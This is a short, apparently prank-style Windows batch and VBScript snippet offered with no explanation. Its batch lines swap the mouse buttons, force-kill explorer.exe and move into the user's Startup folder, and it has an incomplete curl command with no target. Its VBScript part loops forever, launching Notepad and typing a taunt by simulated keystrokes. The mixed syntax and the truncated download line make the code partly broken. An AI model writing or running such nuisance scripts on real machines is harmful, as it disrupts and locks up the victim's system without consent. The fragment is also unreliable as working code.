rundll32 user32, SwapMouseButton
taskkill /f /im explorer.exe
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
curl -0 
cd\
do
Set wshshell = wscript.CreateObject("WScript.Shell")
Wshshell.run "Notepad"
wscript.sleep 25
wshshell.sendkeys "B"
wscript.sleep 25
wshshell.sendkeys "E"
wscript.sleep 25
wshshell.sendkeys "S"
wscript.sleep 25
wshshell.sendkeys "Z"
wscript.sleep 25
wshshell.sendkeys "O"
wscript.sleep 25
wshshell.sendkeys "P"
wscript.sleep 25
wshshell.sendkeys "T"
wscript.sleep 25
wshshell.sendkeys "A"
wscript.sleep 25
wshshell.sendkeys "D"
wscript.sleep 25
wshshell.sendkeys "!"
loop
